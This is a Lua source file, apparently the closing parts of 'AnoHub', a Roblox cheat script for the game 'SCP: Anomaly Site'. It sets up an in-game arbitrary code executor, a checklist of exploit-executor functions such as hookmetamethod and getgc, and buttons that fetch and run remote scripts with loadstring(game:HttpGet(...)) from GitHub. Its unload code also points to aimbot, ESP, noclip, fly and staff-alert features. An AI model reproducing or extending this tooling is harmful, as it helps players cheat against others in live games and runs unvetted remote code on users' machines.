        mainFrame.BorderSizePixel = 0
        mainFrame.Parent = ExecGroup.Container

        local frameCorner = Instance.new("UICorner")
        frameCorner.CornerRadius = UDim.new(0, 6)
        frameCorner.Parent = mainFrame

        local frameStroke = Instance.new("UIStroke")
        frameStroke.Color = Color3.fromRGB(65, 41, 5)
        frameStroke.Thickness = 1
        frameStroke.Parent = mainFrame

        local codeBox = Instance.new("TextBox")
        codeBox.Size = UDim2.new(1, -10, 1, -10)
        codeBox.Position = UDim2.new(0, 5, 0, 5)
        codeBox.BackgroundTransparency = 1
        codeBox.Text = ""
        codeBox.PlaceholderText = "-- Write your Lua code here...\n-- Press F9 to execute"
        codeBox.TextColor3 = Color3.fromRGB(255, 255, 255)
        codeBox.PlaceholderColor3 = Color3.fromRGB(140, 110, 80)
        codeBox.TextSize = 14
        codeBox.Font = Enum.Font.Code
        codeBox.TextXAlignment = Enum.TextXAlignment.Left
        codeBox.TextYAlignment = Enum.TextYAlignment.Top
        codeBox.TextWrapped = true
        codeBox.MultiLine = true
        codeBox.ClearTextOnFocus = false
        codeBox.Parent = mainFrame

        local outputLabel = ExecGroup:AddLabel("Output: (empty)")

        local execFunc = function()
            local code = codeBox.Text
            if not code or code == "" then
                Library:Notify("Enter code first", 3)
                return
            end

            local fn, compileErr = loadstring(code)
            if not fn then
                outputLabel:SetText("Compile: " .. tostring(compileErr):sub(1, 60))
                Library:Notify("Compile error!", 5)
                return
            end

            local ok, err = pcall(fn)

            if ok then
                outputLabel:SetText("Success")
                Library:Notify("Code executed!", 3)
            else
                outputLabel:SetText(tostring(err):sub(1, 60))
                Library:Notify("Runtime error: " .. tostring(err):sub(1, 50), 5)
            end
        end

        ExecGroup:AddButton({
            Text = "Execute",
            Tooltip = "Run the code (F9)",
            Func = execFunc,
        })

        ExecGroup:AddButton({
            Text = "Clear Code",
            Tooltip = "Clear the code box",
            Func = function()
                codeBox.Text = ""
                outputLabel:SetText("Output: (empty)")
            end,
        })

        local InfoGroup = DevTab:AddRightGroupbox("Executor Info")

        local function getExecutorName()
            local name = "Unknown"
            pcall(function()
                if identifyexecutor then
                    local ok, res = pcall(identifyexecutor)
                    if ok then
                        if type(res) == "string" then name = res
                        elseif type(res) == "table" then name = res.Name or "Unknown" end
                    end
                elseif getexecutorname then
                    name = getexecutorname()
                end
            end)
            return name
        end

        local function getIdentity()
            local id = "?"
            pcall(function()
                if getidentity then id = getidentity()
                elseif getthreadidentity then id = getthreadidentity() end
            end)
            return id
        end

        local execNameLbl = InfoGroup:AddLabel("Name: " .. getExecutorName())
        local execIdLbl = InfoGroup:AddLabel("Identity: " .. getIdentity())

        InfoGroup:AddButton({
            Text = "Refresh",
            Tooltip = "Refresh info",
            Func = function()
                execNameLbl:SetText("Name: " .. getExecutorName())
                execIdLbl:SetText("Identity: " .. getIdentity())
                Library:Notify("Refreshed", 3)
            end,
        })

        local SignalGroup = DevTab:AddRightGroupbox("Signals")

        local ratingLabel = SignalGroup:AddLabel("Executor Rating: Checking...")

        local signals = {
            "hookmetamethod", "hookfunction", "replaceclosure", "restorefunction",
            "checkcaller", "getnamecallmethod", "newcclosure",
            "getrawmetatable", "setrawmetatable", "setreadonly", "isreadonly",
            "islclosure", "iscclosure",
            "getgc", "getinstances", "getnilinstances", "getloadedmodules",
            "getscripts", "getcallingscript", "getreg",
            "getupvalue", "setupvalue", "getupvalues", "getconstants", "setconstant",
            "getinfo", "getstack", "setstack", "getproto",
            "getconnections", "firesignal", "fireclickdetector",
            "fireproximityprompt", "firetouchinterest",
            "request", "http_request", "http_get", "http_post",
            "HttpGet", "HttpGetAsync", "HttpPost",
            "writefile", "readfile", "appendfile", "delfile", "isfile",
            "makefolder", "delfolder", "isfolder", "listfiles",
            "loadfile", "dofile",
            "gethui", "protectgui", "unprotectgui",
            "setclipboard", "toclipboard", "getclipboard",
            "setfpscap", "getfpscap",
            "cloneref", "compareinstances", "getcustomasset", "getscriptbytecode",
            "isnetworkowner", "getnetworkowner", "replicatesignal",
            "getidentity", "setidentity", "getthreadidentity", "setthreadidentity",
            "getgenv", "getrenv", "getsenv", "getmenv", "gettenv",
            "base64_encode", "base64_decode",
            "crypt_base64_encode", "crypt_base64_decode",
            "crypt_hash", "crypt_encrypt", "crypt_decrypt",
            "rconsoleprint", "rconsolewarn", "rconsoleerr",
            "rconsoleclear", "rconsolename", "rconsoleinfo",
        }

        local signalLabels = {}

        local function getFoundCount()
            local found = 0
            for _, sig in ipairs(signals) do
                local exists = false
                pcall(function()
                    if _G[sig] or (getfenv and getfenv()[sig]) then exists = true end
                end)
                if exists then found = found + 1 end
            end
            return found
        end

        local function updateRating()
            local found = getFoundCount()
            local total = #signals
            local percent = (found / total) * 100

            local ratingText
            if percent >= 90 then
                ratingText = "Executor Rating: " .. found .. "/" .. total .. " (" .. math.floor(percent) .. "%) - IMBA"
            elseif percent >= 50 then
                ratingText = "Executor Rating: " .. found .. "/" .. total .. " (" .. math.floor(percent) .. "%) - OK"
            else
                ratingText = "Executor Rating: " .. found .. "/" .. total .. " (" .. math.floor(percent) .. "%) - BAD"
            end

            ratingLabel:SetText(ratingText)
        end

        local function checkSignals()
            for _, item in ipairs(signalLabels) do
                local exists = false
                pcall(function()
                    if _G[item.name] or (getfenv and getfenv()[item.name]) then exists = true end
                end)
                local prefix = exists and "✅ " or "❌ "
                item.label:SetText(prefix .. item.name)
            end
            updateRating()
        end

        for _, sig in ipairs(signals) do
            local exists = false
            pcall(function()
                if _G[sig] or (getfenv and getfenv()[sig]) then exists = true end
            end)
            local prefix = exists and "✅ " or "❌ "
            local label = SignalGroup:AddLabel(prefix .. sig)
            table.insert(signalLabels, {name = sig, label = label})
        end

        updateRating()

        SignalGroup:AddButton({
            Text = "Recheck All",
            Tooltip = "Recheck signals",
            Func = function()
                checkSignals()
                Library:Notify("Rechecked", 3)
            end,
        })

        local GameGroup = DevTab:AddRightGroupbox("Game Info")

        local placeIdLbl = GameGroup:AddLabel("PlaceId: " .. game.PlaceId)
        local jobIdLbl = GameGroup:AddLabel("JobId: " .. string.sub(game.JobId, 1, 15) .. "...")
        local playersLbl = GameGroup:AddLabel("Players: " .. #Players:GetPlayers())
        local pingLbl = GameGroup:AddLabel("Ping: --")
        local fpsLbl = GameGroup:AddLabel("FPS: --")
        local memLbl = GameGroup:AddLabel("Memory: -- MB")
        local uptimeLbl = GameGroup:AddLabel("Uptime: 00:00:00")

        local gameStart = tick()
        local gameFrames = 0
        local gameLastTick = tick()

        task.spawn(function()
            while task.wait(1) do
                pcall(function()
                    local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
                    pingLbl:SetText("Ping: " .. ping)
                end)

                gameFrames = gameFrames + 1
                local elapsed = tick() - gameLastTick
                if elapsed >= 1 then
                    local fps = math.floor(gameFrames / elapsed)
                    fpsLbl:SetText("FPS: " .. fps)
                    gameFrames = 0
                    gameLastTick = tick()
                end

                pcall(function()
                    local mem = math.floor(game:GetService("Stats"):GetTotalMemoryUsageMb())
                    memLbl:SetText("Memory: " .. mem .. " MB")
                end)

                playersLbl:SetText("Players: " .. #Players:GetPlayers())

                local uptime = math.floor(tick() - gameStart)
                local min = math.floor(uptime / 60)
                local sec = uptime % 60
                local hour = math.floor(min / 60)
                min = min % 60
                uptimeLbl:SetText(string.format("Uptime: %02d:%02d:%02d", hour, min, sec))
            end
        end)

        local InstanceGroup = DevTab:AddLeftGroupbox("Instance Counter")

        local instTotalLbl = InstanceGroup:AddLabel("Total: --")
        local instPartsLbl = InstanceGroup:AddLabel("Parts: --")
        local instScriptsLbl = InstanceGroup:AddLabel("Scripts: --")
        local instModelsLbl = InstanceGroup:AddLabel("Models: --")
        local instGuiLbl = InstanceGroup:AddLabel("GUI: --")

        local function countInstances()
            local total, parts, scripts, models, gui = 0, 0, 0, 0, 0
            for _, obj in pairs(game:GetDescendants()) do
                total = total + 1
                if obj:IsA("BasePart") then parts = parts + 1
                elseif obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then scripts = scripts + 1
                elseif obj:IsA("Model") then models = models + 1
                elseif obj:IsA("GuiObject") then gui = gui + 1 end
            end
            instTotalLbl:SetText("Total: " .. total)
            instPartsLbl:SetText("Parts: " .. parts)
            instScriptsLbl:SetText("Scripts: " .. scripts)
            instModelsLbl:SetText("Models: " .. models)
            instGuiLbl:SetText("GUI: " .. gui)
        end

        InstanceGroup:AddButton({
            Text = "Count Now",
            Tooltip = "Count all instances",
            Func = function()
                countInstances()
                Library:Notify("Counted instances", 3)
            end,
        })

        local DevToolsGroup = DevTab:AddRightGroupbox("Dev Tools")

        DevToolsGroup:AddButton({
            Text = "Force GC",
            Tooltip = "Force garbage collector",
            Func = function()
                if collectgarbage then
                    collectgarbage("collect")
                    Library:Notify("GC forced", 3)
                else
                    Library:Notify("collectgarbage not available", 3)
                end
            end,
        })

        DevToolsGroup:AddDivider()

        DevToolsGroup:AddButton({
            Text = "IY",
            Tooltip = "Load Infinite Yield",
            Func = function()
                task.spawn(function()
                    pcall(function()
                        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
                        Library:Notify("IY loaded!", 5)
                    end)
                end)
            end,
        })

        DevToolsGroup:AddButton({
            Text = "DEX",
            Tooltip = "Load Dex Explorer",
            Func = function()
                task.spawn(function()
                    pcall(function()
                        loadstring(game:HttpGet("https://github.com/AZYsGithub/DexPlusPlus/releases/latest/download/out.lua"))()
                        Library:Notify("Dex loaded!", 5)
                    end)
                end)
            end,
        })

        local DangerGroup = DevTab:AddRightGroupbox("Danger Zone")

        DangerGroup:AddButton({
            Text = "Fully Unload AnoHub",
            Tooltip = "Unload everything",
            Func = function()
                pcall(function() _G.espCleanup() end)
                pcall(function() _G.Window:Destroy() end)
                pcall(function() _G.spectateGui:Destroy() end)
                pcall(function() _G.aimbotFovCircle:Destroy() end)
                pcall(function() _G.mobileAimbotGui:Destroy() end)
                pcall(function() if _G.noclipConn then _G.noclipConn:Disconnect() end end)
                pcall(function() if _G.flyLoop then _G.flyLoop:Disconnect() end end)
                pcall(function() if swimConn then swimConn:Disconnect() end end)
                pcall(function() workspace.Gravity = 196.2 end)
                pcall(function() _G.Library:Unload() end)
                for _, obj in ipairs(LocalPlayer.PlayerGui:GetDescendants()) do
                    if obj.Name == "AnoHubKeySystem" or obj.Name == "AnoHubMobileAimbot" or obj.Name == "AimbotFOV" or obj.Name == "AnusBgGui" or obj.Name == "HalloweenBgGui" or obj.Name == "AnoHubAchPopup" then
                        pcall(function() obj:Destroy() end)
                    end
                end
            end,
        })

        UserInputService.InputBegan:Connect(function(input, gp)
            if gp then return end
            if input.KeyCode == Enum.KeyCode.F9 then
                pcall(execFunc)
            end
        end)
    end
end
print("[AnoHub] Part 3/4 loaded")
do
    local Library = _G.Library
    local Tabs = _G.Tabs
    local Players = _G.Players
    local LocalPlayer = _G.LocalPlayer
    local UserInputService = _G.UserInputService
    local ScriptConfig = _G.ScriptConfig
    local SaveManager = _G.SaveManager
    local ThemeManager = _G.ThemeManager
    local statsCounter = _G.statsCounter

    local SettingsTab = Tabs.Settings
    local MenuGroup = SettingsTab:AddLeftGroupbox("Menu")

    MenuGroup:AddToggle("KeybindMenuOpen", {
        Default = Library.KeybindFrame.Visible,
        Text = "Open Keybind Menu",
        Tooltip = "Show keybind change menu",
        Callback = function(value) Library.KeybindFrame.Visible = value end,
    })
    MenuGroup:AddToggle("ShowCustomCursor", {
        Text = "Custom Cursor", Default = false,
        Tooltip = "Custom cursor",
        Callback = function(Value) Library.ShowCustomCursor = Value end,
    })
    MenuGroup:AddToggle("AlwaysOnTop", {
        Text = "Always On Top", Default = true,
        Tooltip = "Menu always on top",
        Callback = function(Value) _G.Window:SetAlwaysOnTop(Value) end,
    })
    MenuGroup:AddDivider()
    MenuGroup:AddLabel("Menu Keybind: " .. ScriptConfig.MenuKeybind)
    MenuGroup:AddLabel("Aimbot: Toggle + Hold RMB")
    MenuGroup:AddDivider()

    MenuGroup:AddButton({
        Text = "Apply Halloween Theme",
        Tooltip = "Spooky Halloween theme",
        Func = function()
            statsCounter.themeChanges = (statsCounter.themeChanges or 0) + 1
            if _G.ApplyHalloweenTheme then
                _G.ApplyHalloweenTheme()
            else
                pcall(function()
                    ThemeManager:ApplyTheme("Halloween")
                    Library.Scheme.BackgroundColor = Color3.fromRGB(24, 17, 17)
                    Library.Scheme.MainColor       = Color3.fromRGB(126, 78, 15)
                    Library.Scheme.AccentColor     = Color3.fromRGB(215, 110, 0)
                    Library.Scheme.OutlineColor    = Color3.fromRGB(65, 41, 5)
                    Library.Scheme.FontColor       = Color3.fromRGB(255, 255, 255)
                    Library:UpdateColorsUsingRegistry()
                    _G.HalloweenThemeApplied = true
                    Library:Notify("Halloween theme applied!", 5)
                end)
            end
        end,
    })

    MenuGroup:AddButton({
        Text = "Reset to AnoHub Red",
        Tooltip = "Back to default red theme",
        Func = function()
            statsCounter.themeChanges = (statsCounter.themeChanges or 0) + 1
            pcall(function()
                Library.Scheme.BackgroundColor = Color3.fromRGB(20, 15, 15)
                Library.Scheme.MainColor       = Color3.fromRGB(35, 20, 20)
                Library.Scheme.AccentColor     = Color3.fromRGB(205, 92, 92)
                Library.Scheme.OutlineColor    = Color3.fromRGB(60, 30, 30)
                Library.Scheme.FontColor       = Color3.fromRGB(255, 255, 255)
                Library:UpdateColorsUsingRegistry()
                _G.HalloweenThemeApplied = false
                Library:Notify("Reset to AnoHub Red", 4)
            end)
        end,
    })

    MenuGroup:AddDivider()

    MenuGroup:AddButton({
        Text = "Copy Discord",
        Tooltip = "Copies Discord link",
        Func = function() setclipboard(ScriptConfig.DiscordLink) Library:Notify("Discord copied") end,
    })

    MenuGroup:AddButton({
        Text = "Close / Unload",
        Tooltip = "Fully unloads the script",
        Func = function()
            pcall(function() _G.espCleanup() end)
            pcall(function() _G.Window:Destroy() end)
            pcall(function() _G.spectateGui:Destroy() end)
            pcall(function() _G.aimbotFovCircle:Destroy() end)
            pcall(function() _G.mobileAimbotGui:Destroy() end)
            pcall(function() workspace.Gravity = 196.2 end)
            pcall(function() if _G.antiVoidConn then _G.antiVoidConn:Disconnect() end end)
            pcall(function() if _G.antiAfkConn then _G.antiAfkConn:Disconnect() end end)
            pcall(function() if _G.tpWalkConn then _G.tpWalkConn:Disconnect() end end)
            pcall(function() if _G.xrayLoop then _G.xrayLoop:Disconnect() end end)
            pcall(function() if _G.aimbotConnection then _G.aimbotConnection:Disconnect() end end)
            pcall(function() if _G.infiniteJumpConn then _G.infiniteJumpConn:Disconnect() end end)
            pcall(function() if _G.autoRejoinConn then _G.autoRejoinConn:Disconnect() end end)
            pcall(function() _G.Library:Unload() end)

            for _, obj in ipairs(LocalPlayer.PlayerGui:GetDescendants()) do
                if obj.Name == "AnoHubKeySystem"
                or obj.Name == "AnoHubMobileAimbot"
                or obj.Name == "AimbotFOV"
                or obj.Name == "AnusBgGui"
                or obj.Name == "HalloweenBgGui"
                or obj.Name == "AnoHubAchPopup" then
                    pcall(function() obj:Destroy() end)
                end
            end
        end,
    })

    SaveManager:BuildConfigSection(SettingsTab)
    ThemeManager:ApplyToTab(SettingsTab)

    local autoRestoreList = {
        "Noclip", "Fly", "InfiniteJump", "AntiGravity",
        "AntiVoid", "TPWalk", "LowGraphics",
        "PlayerESP", "NPCESP", "ItemsESP",
        "StaffAlertToggle", "ChatNotify",
        "PartESPToggle",
        "PR_Door", "PR_Hostile", "PR_Escape",
        "Aimbot", "LockOn",
        "SpecialRoleWLEnabled", "PlayerWhitelist",
    }

    local function restoreToggles()
        task.wait(0.5)
        for _, toggleName in ipairs(autoRestoreList) do
            pcall(function()
                local toggle = Library.Toggles and Library.Toggles[toggleName]
                if toggle and toggle.Value and toggle.Callback then
                    toggle:Callback(toggle.Value)
                end
            end)
        end
    end

    pcall(function() SaveManager:LoadAutoloadConfig() end)

    task.spawn(function()
        task.wait(2)
        restoreToggles()
    end)

    LocalPlayer.CharacterAdded:Connect(function()
        task.wait(2)
        restoreToggles()
    end)

    local MENU_KEY = Enum.KeyCode.RightShift
    local lastToggle = 0

    local function tryToggleMenu()
        if tick() - lastToggle < 0.2 then return end
        lastToggle = tick()
        if _G.Window and _G.Window.Toggle then
            pcall(function() _G.Window:Toggle() end)
        end
    end

    UserInputService.InputBegan:Connect(function(input)
        if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
        if input.KeyCode ~= MENU_KEY then return end
        tryToggleMenu()
    end)

    UserInputService.InputEnded:Connect(function(input)
        if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
        if input.KeyCode ~= MENU_KEY then return end
        tryToggleMenu()
    end)

    print("[AnoHub] Menu keybind: RightShift")
end

print("[AnoHub] Part 4/4 loaded")
print("[AnoHub] All 4 parts loaded successfully!")
print("[AnoHub] SCP: Anomaly Site")
